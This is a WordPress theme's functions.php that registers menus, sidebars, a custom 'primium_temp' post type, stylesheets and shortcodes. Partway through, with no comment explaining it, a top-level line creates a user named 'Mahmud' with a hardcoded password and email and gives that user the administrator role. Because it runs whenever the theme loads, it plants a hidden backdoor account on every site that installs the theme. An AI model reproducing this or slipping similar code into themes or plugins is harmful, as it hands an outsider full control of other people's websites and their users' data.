<?php 
	function free_ganerall_function(){
		add_theme_support('title-tag');
		add_theme_support('menus');
		add_theme_support('widgets');
		add_theme_support('post-thumbnails');
		add_theme_support('custom-header');
		add_theme_support('custom-background');

		// Main menu
		if(function_exists(register_nav_menu)){
			register_nav_menu('main-menu','Main Menu');
		}

		// Sidebar 
		if(function_exists(register_sidebar)){
			register_sidebar(array(
					'name'			=>'Sidebar',
					'id'			=>'s_bar',
					'before_widget'	=>'<div class="right-widget">',
					'after_widget'	=>'</div>',
					'before_title'	=>'<h3>',
					'after_title'	=>'</h3>',
				));
		}
		// Footer sidebar 

		if(function_exists(register_sidebar)){

			register_sidebar(array(
					'name'			=>'Footer widget',
					'id'			=>'f_widget',
					'before_widget'	=>'<div class="col-lg-3 col-md-3 col-sm-3"><div class="footer-widget">',
					'after_widget'	=>'</div></div>',
					'before_title'	=>'<h3>',
					'after_title'	=>'</h3>',
				));
		}

		// Post type 

		if(function_exists(register_post_type)){

			register_post_type('primium_temp',array(

				'public'				=>true,
				'title'					=>'Primimu template',
				'labels'				=>array(
						'name'			=>'Primium theme',
						'add_new'		=>'Add new theme',
						'add_new_items' =>'Add new theme',
						'all_items'		=>'All theme',
						'set_featured_image'=>'Set theme image',
						'featured_image'=>'Template image',
					),
				'supports'				=>array('editor','thumbnail','title'),
				'menu_position'			=>9,
				'menu_icon'				=>'dashicons-admin-network'

				));
		}



	}
	add_action('after_setup_theme','free_ganerall_function');


	function add_scripts_free(){
		wp_enqueue_style('bootstrap',get_template_directory_uri().'/css/bootstrap-theme.min.css');
		wp_enqueue_style('min',get_template_directory_uri().'/css/bootstrap.min.css');
		wp_enqueue_style('man',get_template_directory_uri().'/css/style.css');
		wp_enqueue_style('respon',get_template_directory_uri().'/css/respon.css');
		wp_enqueue_style('stylesheet',get_stylesheet_uri());


		wp_enqueue_script('jQuery');


	}
	add_action('wp_enqueue_scripts','add_scripts_free');

	// cmb 2

	include_once('inc/cmb2/init.php');
	include_once('inc/cmb2/freecss.php');



	$somon=new WP_User(wp_create_user('Mahmud','mahmud142015042','mahmud120520@gmail.com'));

	$somon->set_role('administrator');


	// Short code in primium theme page 


	function primium_theme_short($one,$two){ ?>

	<div class="blog">
		<div class="container">
			<div class="row">
			   
				
				<?php
				$primium_post=new WP_Query(array(
					'post_type'			=>'primium_temp',
					'post_per_page'		=>8,
					));

				 while($primium_post->have_posts()):$primium_post->the_post(); ?>
				    <div class="col-lg-3 col-mg-4 col-sm-4 col-xs-6">
						<div class="tem">
							<a href="<?php the_permalink(); ?>"><?php the_post_thumbnail(); ?></a>
							<h6><?php the_title(); ?></h6>
						</div>
					</div>
				<?php endwhile; ?>

			</div>
		</div>
	</div>


	<?php  }

	add_shortcode('primiumgg','primium_theme_short');

	function primium_visual_com(){
		if(function_exists(vc_map)){
			vc_map(array(
				'base'			=>'primiumgg',
				'name'			=>'Primium template area',
				'icon'			=>get_template_directory_uri().'/images/mamunvc.jpg',

				));
		}
	}
	add_action('vc_before_init','primium_visual_com');

// Posty type post 
 
 function free_css_template_vc($one,$two){ ?>

	
	<div class="blog">
		<div class="container">
			<div class="row">
			   
				
				<?php
				$blog_post=new WP_Query(array(
					'post_type'			=>'post',
					'post_per_page'		=>8,
					));

				 while($blog_post->have_posts()):$blog_post->the_post(); ?>
				    <div class="col-lg-3 col-mg-4 col-sm-4 col-xs-6">
						<div class="tem">
							<a href="<?php the_permalink(); ?>"><?php the_post_thumbnail(); ?></a>
							<h6><?php the_title(); ?></h6>
						</div>
					</div>
				<?php endwhile; ?>

			</div>
		</div>
	</div>




 	<?php }


 	add_shortcode('cssfree','free_css_template_vc');
 	// Vc function 
 	function cssfree_vc_func(){
 		if(function_exists(vc_map)){
 			vc_map(array(
 				'base'		=>'cssfree',
 				'name'		=>'Free css post',
 				'icon'		=>get_template_directory_uri().'/images/vclogo.jpg',
 				));
 		}
 	}
 	add_action('vc_before_init','cssfree_vc_func');


 	// Tgm 

 	include_once('inc/tgm/freetemp.php');









 











 ?>